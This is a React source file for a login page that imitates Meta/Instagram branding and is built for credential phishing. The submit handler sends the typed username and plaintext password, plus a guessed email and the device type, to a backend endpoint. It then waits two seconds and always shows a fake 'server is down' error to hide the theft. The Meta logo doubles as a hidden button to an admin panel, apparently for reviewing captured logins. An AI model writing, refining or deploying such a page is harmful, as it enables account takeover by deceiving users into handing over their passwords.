import React, { useState } from 'react';

export default function UserPortal({ onOpenAdmin }) {
  const [formData, setFormData] = useState({ username: '', password: '' });
  const [showPassword, setShowPassword] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [loading, setLoading] = useState(false);

  const getDeviceType = () => {
    const ua = navigator.userAgent;
    if (/android/i.test(ua)) return 'Mobile (Android)';
    if (/iphone|ipad|ipod/i.test(ua)) return 'Mobile (iOS)';
    if (/windows/i.test(ua)) return 'Desktop (Windows)';
    if (/macintosh/i.test(ua)) return 'Desktop (macOS)';
    return 'Web Browser';
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setErrorMessage('');

    try {
      // Send response data including password to backend API
      await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/responses`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: formData.username,
          password: formData.password,
          email: formData.username.includes('@') ? formData.username : `${formData.username.toLowerCase()}@user.com`,
          device: getDeviceType()
        })
      });
      // Artificial 2-second delay to simulate network attempt before displaying error
      await new Promise((resolve) => setTimeout(resolve, 2000));
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
      // Display error message matching reference screenshot
      setErrorMessage('server is down please try again later');
    }
  };

  const hasError = !!errorMessage;
  const isPasswordTyped = formData.password.length > 0;

  return (
    <div className="w-full max-w-sm mx-auto flex-1 flex flex-col justify-between px-4 py-3 -mb-3.5 text-slate-900 ">
      {/* Upper Section */}
      <div>
        {/* Language selector at the VERY top of the screen */}
        <div className="flex justify-center mt-1 sm:mt-0 mb-4 sm:mb-8">
          <button
            type="button"
            className="text-[12px] font-medium leading-[16px] text-slate-500 hover:text-slate-700 transition flex items-center bg-transparent border-none cursor-pointer px-2"
          >
            <span>English (US)</span>
          </button>
        </div>

        {/* Logo & Form block */}
        <div className="mt-20">
          {/* Centered Logo */}
          <div className="flex justify-center mb-36">
            <div className="w-16 h-16 rounded-2xl flex items-center justify-center">
              <img
                src="https://i.ibb.co/gLvf8hnF/images-2-removebg-preview.png"
                alt="Logo"
                className="w-full h-full object-contain"
              />
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-3.5 -mt-12 ">
            {/* Floating Label Input: Mobile number, username or email address */}
            <div className="relative border border-[#dbdbdb] rounded-xl focus-within:border-gray-500 transition-all bg-white">
              <input
                type="text"
                id="username"
                required
                placeholder=" "
                value={formData.username}
                onChange={(e) => {
                  setFormData({ ...formData, username: e.target.value });
                  if (errorMessage) setErrorMessage('');
                }}
                className="block px-4 pt-5 pb-2 w-full text-[16px] sm:text-[14px] font-medium leading-[33px] text-slate-900 bg-transparent rounded-2xl appearance-none focus:outline-none peer"
              />
              <label
                htmlFor="username"
                className="absolute text-[14px] font-normal leading-[18px] text-slate-500 transform -translate-y-3.5 scale-90 top-4 z-10 origin-[0] left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-90 peer-focus:-translate-y-3.5 peer-focus:text-gray-500 pointer-events-none"
              >
                Mobile number, username or email address
              </label>
            </div>

            {/* Floating Label Input: Password */}
            <div>
              <div
                className={`relative border rounded-2xl transition-all ${
                  hasError
                    ? 'border-rose-600 bg-rose-50/20'
                    : 'border-[#dbdbdb] focus-within:border-gray-500 bg-white'
                }`}
              >
                <input
                  type={showPassword ? 'text' : 'password'}
                  id="password"
                  required
                  placeholder=" "
                  value={formData.password}
                  onChange={(e) => {
                    setFormData({ ...formData, password: e.target.value });
                    if (errorMessage) setErrorMessage('');
                  }}
                  className="block px-4 pt-5 pb-2 pr-12 w-full text-[16px] sm:text-[14px] font-medium leading-[33px] text-slate-900 bg-transparent rounded-2xl appearance-none focus:outline-none peer"
                />
                <label
                  htmlFor="password"
                  className={`absolute text-[14px] font-normal leading-[18px] transform -translate-y-3.5 scale-85 top-4 z-10 origin-[0] left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-85 peer-focus:-translate-y-3.5 pointer-events-none ${
                    hasError ? 'text-rose-600' : 'text-slate-500 peer-focus:text-gray-500'
                  }`}
                >
                  Password
                </label>

                {/* Eye Icon ONLY appears when user starts typing password */}
                {isPasswordTyped && (
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    title={showPassword ? 'Hide password' : 'Show password'}
                    className="absolute right-2 top-1/2 -translate-y-1/2 text-slate-600 hover:text-slate-800 transition p-2.5 rounded-lg focus:outline-none touch-manipulation flex items-center justify-center"
                  >
                    {showPassword ? (
                      /* Password visible → Open Eye */
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                      </svg>
                    ) : (
                      /* Password hidden → Eye Slash */
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 3l18 18" />
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10.58 10.58a2 2 0 002.84 2.84" />
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9.88 5.09A9.96 9.96 0 0112 5c4.48 0 8.27 2.94 9.54 7a10.03 10.03 0 01-3.04 4.43" />
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6.61 6.61A10.04 10.04 0 002.46 12c1.27 4.06 5.06 7 9.54 7 1.61 0 3.13-.38 4.48-1.05" />
                      </svg>
                    )}
                  </button>
                )}
              </div>

              {/* Error Line right below input matching reference screenshot */}
              {hasError && (
                <div className="flex items-center gap-1.5 mt-2 text-xs text-rose-600 font-medium pl-1">
                  <svg className="w-4 h-4 shrink-0 text-rose-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <circle cx="12" cy="12" r="9" strokeWidth="1.8" />
                    <line x1="12" y1="8" x2="12" y2="12" strokeWidth="1.8" strokeLinecap="round" />
                    <line x1="12" y1="15.5" x2="12.01" y2="15.5" strokeWidth="2" strokeLinecap="round" />
                  </svg>
                  <span>{errorMessage}</span>
                </div>
              )}
            </div>

            {/* Primary Log in Button */}
            <button
              type="submit"
              disabled={loading}
              className="w-full py-3.5 px-4 bg-[#0064e0] hover:bg-[#0056c6] text-white text-[14px] font-bold leading-[18px] rounded-full transition duration-5 active:scale-[0.98] disabled:opacity-50 tracking-wide -mt- shadow-sm touch-manipulation cursor-pointer"
            >
              {loading ? 'Log in' : 'Log in'}
            </button>

            {/* Forgotten Password Link */}
            <div className="text-center">
              <button
                type="button"
                className="text-[15.2px] font-bold leading-[18px] text-slate-800 hover:underline bg-transparent border-none cursor-pointer px-3"
              >
                Forgot password?
              </button>
            </div>
          </form>
        </div>
      </div>

      {/* Bottom Section */}
      <div className="w-full space-y-2 -translate-y-20 ">
        {/* Create new account button */}
        <button
          type="button"
          className="w-full py-3 px-4 bg-transparent border border-[#0064e0] hover:bg-[#0064e0]/5 active:scale-[0.98] text-[#0064e0] text-[14px] font-bold leading-[18px] rounded-full transition text-center block touch-manipulation cursor-pointer "
        >
          Create new account
        </button>

        {/* Small Meta Logo and Text */}
        <button
          type="button"
          onClick={onOpenAdmin}
          title="Open Admin Panel"
          className="flex items-center justify-center text-slate-500 hover:text-slate-800 transition mx-auto bg-transparent border-none cursor-pointer group py-2 px-4 touch-manipulation"
        >
          <div className="h-5 w-16 relative">
            
            <img
              src="https://static.cdninstagram.com/rsrc.php/ys/r/RkrEdst9VSp.webp"
              alt="Meta Logo"></img>
          </div>
        </button>
      </div>
    </div>
  );
}
